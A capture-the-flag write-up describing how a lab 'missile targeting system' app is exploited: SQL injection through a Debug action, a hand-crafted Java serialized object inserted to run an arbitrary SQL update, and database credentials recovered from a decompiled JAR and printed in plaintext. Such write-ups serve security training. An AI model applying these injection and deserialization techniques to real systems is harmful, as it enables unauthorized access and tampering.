# Objective 22: Missile Diversion
**Location: Space Island: Zenith SGS**

For this objective the same Docker image and Wireguard VPN connection as in [Objective 21](../Objective-21) is used.
The aim is to change the pointing mode from 0 ("Earth Point Mode") to 1 ("Sun Point Mode").

In the first step, the app "missile-targeting-system" is started just like the "camera" app in objective 21.

The "Action Service" of this app has the predefined action "Debug", which is vulnerable to SQL injections by supplying additional data like `; show grants` as "AttributeValue".
The output of these injections can be found on the "nanosat-mo-supervisor" tab, subtab "Apps Launcher service":
```
INFO: Debug action output: VERSION(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204 | 
Grants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | 
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | 
```
More information about the database content in section "Bonus" below.

As the table "satellite_query" is the only one we have write access to, we need to focus on this.
Checking the contained data shows a serialized Java object in column "object" and a [Java source code](SatelliteQueryFileFolderUtility.java) in column "result" (working with binary data should done using the MariaDB contained to_base64 and from_base64 functions).

Using [SerializationDumper](https://github.com/NickstaDB/SerializationDumper) we can analyse the serialized object:
```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 31 - 0x00 1f
        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479
      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 3 - 0x00 03
      Fields
        0:
          Boolean - Z - 0x5a
          fieldName
            Length - 7 - 0x00 07
            Value - isQuery - 0x69735175657279
        1:
          Boolean - Z - 0x5a
          fieldName
            Length - 8 - 0x00 08
            Value - isUpdate - 0x6973557064617465
        2:
          Object - L - 0x4c
          fieldName
            Length - 15 - 0x00 0f
            Value - pathOrStatement - 0x706174684f7253746174656d656e74
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)false - 0x00
          isUpdate
            (boolean)false - 0x00
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 41 - 0x00 29
                Value - /opt/SatelliteQueryFileFolderUtility.java - 0x2f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661
```
So this is a serialization of an object of class  "SatelliteQueryFileFolderUtility" - from which we presumably have a source code in column 3.
We can see, that "isQuery" and "isUpdate" are both "false" and "pathOrStatement" contains "/opt/SatelliteQueryFileFolderUtility.java". With these parameters, a call to the "getResults" method of this object delivers the file content of "/opt/SatelliteQueryFileFolderUtility.java", which is the source code of the class.

Following the source code, the two booleans can be set to "true" and the string to "update pointing_mode set numerical_mode=1" in order to modify the pointing mode:
Modification of the above:
```
SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)true - 0x01
          isUpdate
            (boolean)true - 0x01
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 41 - 0x00 29
                Value - update pointing_mode set numerical_mode=1 - 0x75706461746520706f696e74696e675f6d6f646520736574206e756d65726963616c5f6d6f64653d31
```

Full serialized object (readable):
```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 31 - 0x00 1f
        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479
      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 3 - 0x00 03
      Fields
        0:
          Boolean - Z - 0x5a
          fieldName
            Length - 7 - 0x00 07
            Value - isQuery - 0x69735175657279
        1:
          Boolean - Z - 0x5a
          fieldName
            Length - 8 - 0x00 08
            Value - isUpdate - 0x6973557064617465
        2:
          Object - L - 0x4c
          fieldName
            Length - 15 - 0x00 0f
            Value - pathOrStatement - 0x706174684f7253746174656d656e74
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)true - 0x01
          isUpdate
            (boolean)true - 0x01
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 41 - 0x00 29
                Value - update pointing_mode set numerical_mode=1 - 0x75706461746520706f696e74696e675f6d6f646520736574206e756d65726963616c5f6d6f64653d31
```
Converting this back into the serialized object and inserting this into the table
```
mysql> insert into satellite_query (object) values (from_base64("rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAEBdAApdXBkYXRlIHBvaW50aW5nX21vZGUgc2V0IG51bWVyaWNhbF9tb2RlPTE="));
```

In the background on server side a process is running which picks this serialized object, executes the "getResults" method of it and updates the database in the "results" column accordingly.

So the above serialized object leads to the expected result in column "results" and to the updated "pointing_mode":
```
|   2 | 0xACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174002975706461746520706F696E74696E675F6D6F646520736574206E756D65726963616C5F6D6F64653D31 | SQL Update completed.

mysql> select * from pointing_mode;
+----+----------------+
| id | numerical_mode |
+----+----------------+
|  1 |              1 |
+----+----------------+
1 row in set (0,13 sec)

```

**Achievement: Missile Diversion**


### Bonus

The credentials of the user "targeter" are in "MissileTargetingSystemMCAdapter.class" (part of "missile-targeting-system-2.1.0-SNAPSHOT.jar" contained in the Docker container), which can be decompiled (for example using [JD-GUI](http://java-decompiler.github.io/)):
```
Connection connection = DriverManager.getConnection("jdbc:mariadb://localhost:3306/missile_targeting_system?allowMultiQueries=true", "targeter", "cu3xmzp9tzpi00bdqvxq");
```
Using these credentials, it is much easier to interact with the database directly (still through the Wireguard VPN, of course):
```
mysql> show grants;
+---------------------------------------------------------------------------------------------------------+
| Grants for targeter@%                                                                                   |
+---------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' |
| GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%`                  |
| GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%`                            |
| GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%`                                |
| GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%`                       |
| GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%`                     |
+---------------------------------------------------------------------------------------------------------+
6 rows in set (0,14 sec)

mysql> select * from pointing_mode;
+----+----------------+
| id | numerical_mode |
+----+----------------+
|  1 |              0 |
+----+----------------+
1 row in set (0,12 sec)

mysql> select * from messaging;
+----+----------------------+------------+
| id | msg_type             | msg_data   |
+----+----------------------+------------+
|  1 | RedAlphaMsg          | RONCTTLA   |
|  2 | MsgAuth              | 220040DL   |
|  3 | LaunchCode           | DLG2209TVX |
|  4 | LaunchOrder          | CONFIRMED  |
|  5 | TargetSelection      | CONFIRMED  |
|  6 | TimeOnTargetSequence | COMPLETE   |
|  7 | YieldSelection       | COMPLETE   |
|  8 | MissileDownlink      | ONLINE     |
|  9 | TargetDownlinked     | FALSE      |
+----+----------------------+------------+
9 rows in set (0,13 sec)

mysql> select * from target_coordinates;
+----+---------+----------+
| id | lat     | lng      |
+----+---------+----------+
|  1 | 1.14514 | -145.262 |
+----+---------+----------+
1 row in set (0,12 sec)

mysql> select * from pointing_mode_to_str;
+----+----------------+------------------+----------------------------------------------------------------------------------------+
| id | numerical_mode | str_mode         | str_desc                                                                               |
+----+----------------+------------------+----------------------------------------------------------------------------------------+
|  1 |              0 | Earth Point Mode | When pointing_mode is 0, targeting system applies the target_coordinates to earth.     |
|  2 |              1 | Sun Point Mode   | When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. |
+----+----------------+------------------+----------------------------------------------------------------------------------------+
2 rows in set (0,13 sec)

mysql> select * from satellite_query;
+-----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| jid | object                                                                                                                                                                                                                                                                                                                         | results                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
+-----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|   1 | 0xACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661 | import java.io.Serializable;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.sql.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import com.google.gson.Gson;

public class SatelliteQueryFileFolderUtility implements Serializable {
    private String pathOrStatement;
    private boolean isQuery;
    private boolean isUpdate;

    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {
        this.pathOrStatement = pathOrStatement;
        this.isQuery = isQuery;
        this.isUpdate = isUpdate;
    }

    public String getResults(Connection connection) {
        if (isQuery && connection != null) {
            if (!isUpdate) {
                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);
                    ResultSet rs = selectStmt.executeQuery()) {
                    List<HashMap<String, String>> rows = new ArrayList<>();
                    while(rs.next()) {
                        HashMap<String, String> row = new HashMap<>();
                        for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) {
                            String key = rs.getMetaData().getColumnName(i);
                            String value = rs.getString(i);
                            row.put(key, value);
                        }
                        rows.add(row);
                    }
                    Gson gson = new Gson();
                    String json = gson.toJson(rows);
                    return json;
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            } else {
                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {
                    pstmt.executeUpdate();
                    return "SQL Update completed.";
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            }
        } else {
            Path path = Paths.get(pathOrStatement);
            try {
                if (Files.notExists(path)) {
                    return "Path does not exist.";
                } else if (Files.isDirectory(path)) {
                    // Use try-with-resources to ensure the stream is closed after use
                    try (Stream<Path> walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents
                        return walk.skip(1) // skip the directory itself
                                .map(p -> Files.isDirectory(p) ? "D: " + p.getFileName() : "F: " + p.getFileName())
                                .collect(Collectors.joining("\n"));
                    }
                } else {
                    // Assume it's a readable file
                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
                }
            } catch (IOException e) {
                return "Error reading path: " + e.toString();
            }
        }
    }

    public String getpathOrStatement() {
        return pathOrStatement;
    }
}
 |
+-----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0,13 sec)
```

The result is calculated and added to the database by a process running on the server side:
```
java -cp SatelliteReader.jar:mariadb-java-client-2.7.4.jar:gson-2.9.1.jar SatelliteReader
```
It uses the database user "targeter_admin" to interact with the database. This user has "update" permissions on the tables "pointing_mode" and "satellite_query".
```
Grants for targeter_admin@%":"GRANT USAGE ON *.* TO `targeter_admin`@`%` IDENTIFIED BY PASSWORD \u0027*4DB0B6CA59DBAC65309B8BE434744367FDF5DCAC\u0027"
Grants for targeter_admin@%":"GRANT SELECT, UPDATE ON `missile_targeting_system`.`pointing_mode` TO `targeter_admin`@`%`
Grants for targeter_admin@%":"GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter_admin`@`%`
Grants for targeter_admin@%":"GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter_admin`@`%`
Grants for targeter_admin@%":"GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter_admin`@`%`
Grants for targeter_admin@%":"GRANT SELECT, INSERT, UPDATE ON `missile_targeting_system`.`satellite_query` TO `targeter_admin`@`%`"
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjQyMTI0NDU0LDQ3MzA1NTY0MSwxMjE1ND
IwNzQsMTI2ODM2MjU2MCwtMTI3MjM2ODk1NiwtNDM0NDU2NTUz
LDEzNTk5NDgwOTMsLTUxMDI3MzI2OCwtNDY2MjQyMzIxLC0yMD
EwMTkyNjNdfQ==
-->